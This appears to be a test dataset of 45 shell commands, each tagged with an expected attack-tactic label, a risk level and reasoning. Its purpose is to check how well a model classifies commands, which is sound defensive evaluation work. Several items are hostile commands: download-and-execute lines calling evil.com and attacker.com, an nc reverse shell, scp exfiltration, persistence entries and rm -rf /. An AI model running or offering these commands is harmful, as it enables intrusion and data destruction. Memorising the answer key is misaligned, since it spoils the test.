@@ -1,0 +1,372 @@
+[
+  {
+    "id": 1,
+    "question": "What is the purpose of this command?",
+    "command": "whoami /all",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Enumerates current user identity, groups, and privileges."
+  },
+  {
+    "id": 2,
+    "question": "Why would an attacker run this command?",
+    "command": "net user /domain",
+    "expected_label": "Discovery",
+    "risk_level": "Medium",
+    "expected_reasoning": "Lists domain users for reconnaissance purposes."
+  },
+  {
+    "id": 3,
+    "question": "Is this command malicious?",
+    "command": "tasklist /v",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Collects running process and execution context information."
+  },
+  {
+    "id": 4,
+    "question": "What attacker behavior does this command indicate?",
+    "command": "ipconfig /all",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Reveals network configuration and interface details."
+  },
+  {
+    "id": 5,
+    "question": "Why is this command suspicious in a breach scenario?",
+    "command": "netstat -ano",
+    "expected_label": "Discovery",
+    "risk_level": "Medium",
+    "expected_reasoning": "Identifies active network connections and listening services."
+  },
+
+  {
+    "id": 6,
+    "question": "What is the intent of this command?",
+    "command": "Invoke-Mimikatz",
+    "expected_label": "Credential Access",
+    "risk_level": "Critical",
+    "expected_reasoning": "Extracts credentials from LSASS memory."
+  },
+  {
+    "id": 7,
+    "question": "Why is this encoded PowerShell command dangerous?",
+    "command": "powershell.exe -enc SQBFAFgA",
+    "expected_label": "Credential Access",
+    "risk_level": "High",
+    "expected_reasoning": "Uses Base64 encoding to hide malicious PowerShell activity."
+  },
+  {
+    "id": 8,
+    "question": "What attacker technique is shown here?",
+    "command": "reg save HKLM\\SAM sam.save",
+    "expected_label": "Credential Access",
+    "risk_level": "High",
+    "expected_reasoning": "Attempts to dump the Security Account Manager database."
+  },
+  {
+    "id": 9,
+    "question": "Why would an attacker run this command?",
+    "command": "lsass.exe dump",
+    "expected_label": "Credential Access",
+    "risk_level": "Critical",
+    "expected_reasoning": "Targets LSASS to retrieve cached credentials."
+  },
+
+  {
+    "id": 10,
+    "question": "Why is this PowerShell execution suspicious?",
+    "command": "powershell -nop -w hidden",
+    "expected_label": "Defense Evasion",
+    "risk_level": "High",
+    "expected_reasoning": "Disables profiles and hides execution window to evade detection."
+  },
+  {
+    "id": 11,
+    "question": "What does this command attempt to bypass?",
+    "command": "amsiutils bypass",
+    "expected_label": "Defense Evasion",
+    "risk_level": "Critical",
+    "expected_reasoning": "Attempts to bypass AMSI scanning protections."
+  },
+  {
+    "id": 12,
+    "question": "Why is this a LOLBin abuse?",
+    "command": "mshta http://evil.com/payload.hta",
+    "expected_label": "Defense Evasion",
+    "risk_level": "High",
+    "expected_reasoning": "Uses trusted mshta.exe to proxy malicious execution."
+  },
+  {
+    "id": 13,
+    "question": "What is the goal of this command?",
+    "command": "certutil.exe -urlcache -split -f http://evil.com/a.exe",
+    "expected_label": "Defense Evasion",
+    "risk_level": "Critical",
+    "expected_reasoning": "Abuses certutil to download malicious payloads."
+  },
+
+  {
+    "id": 14,
+    "question": "What does this command do?",
+    "command": "cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://x')",
+    "expected_label": "Execution",
+    "risk_level": "Critical",
+    "expected_reasoning": "Downloads and executes code directly in memory."
+  },
+  {
+    "id": 15,
+    "question": "Why is this Linux command dangerous?",
+    "command": "curl http://attacker.com/evil.sh | bash",
+    "expected_label": "Execution",
+    "risk_level": "Critical",
+    "expected_reasoning": "Executes remote script without validation."
+  },
+  {
+    "id": 16,
+    "question": "What attack stage does this represent?",
+    "command": "chmod +x payload && ./payload",
+    "expected_label": "Execution",
+    "risk_level": "High",
+    "expected_reasoning": "Makes payload executable and runs it."
+  },
+  {
+    "id": 17,
+    "question": "Why would attackers use this command?",
+    "command": "wmic process call create 'cmd.exe /c evil.bat'",
+    "expected_label": "Execution",
+    "risk_level": "High",
+    "expected_reasoning": "Executes commands through WMI for stealthy execution."
+  },
+
+  {
+    "id": 18,
+    "question": "Does this command establish persistence?",
+    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /d evil.exe",
+    "expected_label": "Persistence",
+    "risk_level": "High",
+    "expected_reasoning": "Ensures malware runs at user logon."
+  },
+  {
+    "id": 19,
+    "question": "Why is this scheduled task suspicious?",
+    "command": "schtasks /create /sc onlogon /tn update /tr evil.exe",
+    "expected_label": "Persistence",
+    "risk_level": "Critical",
+    "expected_reasoning": "Creates scheduled task to maintain persistence."
+  },
+  {
+    "id": 20,
+    "question": "What persistence mechanism is used here?",
+    "command": "(crontab -l; echo '* * * * * /tmp/backdoor.sh') | crontab -",
+    "expected_label": "Persistence",
+    "risk_level": "High",
+    "expected_reasoning": "Uses cron job to execute malicious script repeatedly."
+  },
+
+  {
+    "id": 21,
+    "question": "What does this command indicate?",
+    "command": "nc -e /bin/bash 10.10.10.10 4444",
+    "expected_label": "Command and Control",
+    "risk_level": "Critical",
+    "expected_reasoning": "Creates reverse shell to attacker-controlled server."
+  },
+  {
+    "id": 22,
+    "question": "Why is this behavior associated with C2?",
+    "command": "powershell Invoke-WebRequest http://c2.com/beacon",
+    "expected_label": "Command and Control",
+    "risk_level": "High",
+    "expected_reasoning": "Beaconing to external command-and-control infrastructure."
+  },
+
+  {
+    "id": 23,
+    "question": "Is this command benign or suspicious?",
+    "command": "df -h",
+    "expected_label": "Benign",
+    "risk_level": "None",
+    "expected_reasoning": "Checks disk usage, commonly used by administrators."
+  },
+  {
+    "id": 24,
+    "question": "What does this command do?",
+    "command": "systemctl status nginx",
+    "expected_label": "Benign",
+    "risk_level": "None",
+    "expected_reasoning": "Checks status of the Nginx service."
+  },
+  {
+    "id": 25,
+    "question": "Is this command related to development?",
+    "command": "git clone https://github.com/torvalds/linux.git",
+    "expected_label": "Benign",
+    "risk_level": "None",
+    "expected_reasoning": "Clones a public source code repository."
+  },
+
+  {
+    "id": 26,
+    "question": "Why would an attacker run this command?",
+    "command": "nmap -sS -p- 192.168.1.0/24",
+    "expected_label": "Discovery",
+    "risk_level": "Medium",
+    "expected_reasoning": "Performs stealth port scanning for reconnaissance."
+  },
+  {
+    "id": 27,
+    "question": "What attack technique does this indicate?",
+    "command": "find / -perm -4000 -type f",
+    "expected_label": "Discovery",
+    "risk_level": "Medium",
+    "expected_reasoning": "Searches for SUID binaries for privilege escalation paths."
+  },
+  {
+    "id": 28,
+    "question": "Why is this command suspicious?",
+    "command": "chmod u+s /bin/bash",
+    "expected_label": "Privilege Escalation",
+    "risk_level": "Critical",
+    "expected_reasoning": "Sets SUID bit on bash to gain root privileges."
+  },
+  {
+    "id": 29,
+    "question": "What does this indicate in Linux systems?",
+    "command": "sudo -l",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Lists allowed sudo privileges."
+  },
+  {
+    "id": 30,
+    "question": "Why is this command high risk?",
+    "command": "wget http://evil.com/rootkit.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
+    "expected_label": "Execution",
+    "risk_level": "Critical",
+    "expected_reasoning": "Downloads, hides, and executes a malicious payload."
+  },
+
+  {
+    "id": 31,
+    "question": "What does this command represent?",
+    "command": "top -n 1",
+    "expected_label": "Benign",
+    "risk_level": "None",
+    "expected_reasoning": "Displays system resource usage."
+  },
+  {
+    "id": 32,
+    "question": "Is this command used for reconnaissance?",
+    "command": "ps aux",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Lists running processes."
+  },
+  {
+    "id": 33,
+    "question": "Why is this PowerShell command suspicious?",
+    "command": "Get-Process | Where-Object {$_.ProcessName -like '*powershell*'}",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Enumerates PowerShell processes."
+  },
+  {
+    "id": 34,
+    "question": "What does this command imply?",
+    "command": "python -c \"import socket\"",
+    "expected_label": "Benign",
+    "risk_level": "None",
+    "expected_reasoning": "Basic Python import without malicious behavior."
+  },
+  {
+    "id": 35,
+    "question": "Why is this command potentially malicious?",
+    "command": "base64 -d payload.b64 | bash",
+    "expected_label": "Defense Evasion",
+    "risk_level": "High",
+    "expected_reasoning": "Decodes and executes obfuscated payload."
+  },
+
+  {
+    "id": 36,
+    "question": "What does this registry command indicate?",
+    "command": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Enumerates startup programs."
+  },
+  {
+    "id": 37,
+    "question": "Why would attackers use this command?",
+    "command": "sc query",
+    "expected_label": "Discovery",
+    "risk_level": "Low",
+    "expected_reasoning": "Enumerates Windows services."
+  },
+  {
+    "id": 38,
+    "question": "What is the risk of this command?",
+    "command": "tar czf data.tar.gz /home/user",
+    "expected_label": "Collection",
+    "risk_level": "Medium",
+    "expected_reasoning": "Archives user data, possibly for exfiltration."
+  },
+  {
+    "id": 39,
+    "question": "What attack stage does this belong to?",
+    "command": "scp data.tar.gz attacker@10.0.0.5:/tmp/",
+    "expected_label": "Exfiltration",
+    "risk_level": "High",
+    "expected_reasoning": "Transfers collected data to attacker system."
+  },
+  {
+    "id": 40,
+    "question": "Is this command benign?",
+    "command": "grep -r TODO ./src/",
+    "expected_label": "Benign",
+    "risk_level": "None",
+    "expected_reasoning": "Searches code comments for development purposes."
+  },
+
+  {
+    "id": 41,
+    "question": "Why is this command dangerous?",
+    "command": "rm -rf / --no-preserve-root",
+    "expected_label": "Impact",
+    "risk_level": "Critical",
+    "expected_reasoning": "Destroys entire filesystem."
+  },
+  {
+    "id": 42,
+    "question": "What does this command indicate?",
+    "command": "shutdown -r now",
+    "expected_label": "Impact",
+    "risk_level": "Medium",
+    "expected_reasoning": "Forces system reboot, potentially disrupting operations."
+  },
+  {
+    "id": 43,
+    "question": "Why is this PowerShell command suspicious?",
+    "command": "Invoke-Expression $env:malicious",
+    "expected_label": "Execution",
+    "risk_level": "High",
+    "expected_reasoning": "Executes dynamically supplied content."
+  },
+  {
+    "id": 44,
+    "question": "What attacker behavior does this show?",
+    "command": "history -c",
+    "expected_label": "Defense Evasion",
+    "risk_level": "Medium",
+    "expected_reasoning": "Clears command history to hide activity."
+  },
+  {
+    "id": 45,
+    "question": "Why is this command considered suspicious?",
+    "command": "unset HISTFILE",
+    "expected_label": "Defense Evasion",
+    "risk_level": "Medium",
+    "expected_reasoning": "Prevents command history from being saved."
+  }
+]
